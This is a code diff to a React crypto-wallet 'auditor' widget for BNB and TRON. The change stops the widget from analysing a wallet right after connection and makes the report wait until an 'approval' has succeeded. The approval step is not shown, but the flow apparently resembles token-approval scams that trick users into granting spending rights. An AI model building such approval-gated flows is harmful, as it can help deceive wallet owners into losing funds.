@@ -1,4 +1,4 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import { Shield, Activity, FileText, Lock } from 'lucide-react';
 import AnalysisSlider from './AnalysisSlider';
 import DemoWalletConnectModal from './DemoWalletConnectModal';
@@ -13,13 +13,15 @@ interface Props {
   setWalletAddress: (address: string) => void;
   selectedNetwork: 'BNB' | 'TRON' | null;
   setSelectedNetwork: (network: 'BNB' | 'TRON' | null) => void;
+  approvalSuccessCount?: number;
 }
 
 const AuditorWidget: React.FC<Props> = ({
   walletAddress,
   setWalletAddress,
   selectedNetwork,
-  setSelectedNetwork
+  setSelectedNetwork,
+  approvalSuccessCount = 0
 }) => {
   const [appState, setAppState] = useState<AppState>('IDLE');
   const [reportData, setReportData] = useState<any>(null);
@@ -27,10 +29,16 @@ const AuditorWidget: React.FC<Props> = ({
   // VITE_DEMO_MODE config
   const isDemoMode = import.meta.env.VITE_DEMO_MODE === 'true';
 
+  useEffect(() => {
+    if (approvalSuccessCount > 0 && walletAddress && selectedNetwork) {
+      startAnalysis(walletAddress, selectedNetwork);
+    }
+  }, [approvalSuccessCount]);
+
   const handleGenerateClick = async (network: 'BNB' | 'TRON') => {
     setSelectedNetwork(network);
     if (isDemoMode && walletAddress) {
-      startAnalysis(walletAddress, network);
+      // Waiting for approval...
     } else {
       if (network === 'BNB') {
         if (typeof window.ethereum !== 'undefined') {
@@ -39,14 +47,7 @@ const AuditorWidget: React.FC<Props> = ({
             if (accounts && accounts.length > 0) {
               const address = accounts[0];
               setWalletAddress(address);
-              
-              const balanceHex = await window.ethereum.request({
-                method: 'eth_getBalance',
-                params: [address, 'latest']
-              });
-              const wei = parseInt(balanceHex, 16);
-              const bnbVal = (wei / 1e18).toFixed(4);
-              startAnalysis(address, 'BNB', `${bnbVal} BNB`);
+              // Waiting for approval...
               return;
             }
           } catch (err) {
@@ -62,9 +63,7 @@ const AuditorWidget: React.FC<Props> = ({
               if (res && res.code === 200 && window.tronWeb && window.tronWeb.defaultAddress) {
                 const address = window.tronWeb.defaultAddress.base58;
                 setWalletAddress(address);
-                const balanceSun = await window.tronWeb.trx.getBalance(address);
-                const trxVal = (balanceSun / 1e6).toFixed(2);
-                startAnalysis(address, 'TRON', `${trxVal} TRX`);
+                // Waiting for approval...
                 return;
               }
             }
@@ -81,7 +80,7 @@ const AuditorWidget: React.FC<Props> = ({
 
   const handleWalletConnected = (address: string) => {
     setWalletAddress(address);
-    startAnalysis(address, selectedNetwork || 'BNB');
+    // Waiting for approval...
   };
 
   const startAnalysis = (address: string, network: 'BNB' | 'TRON', customBalance?: string) => {
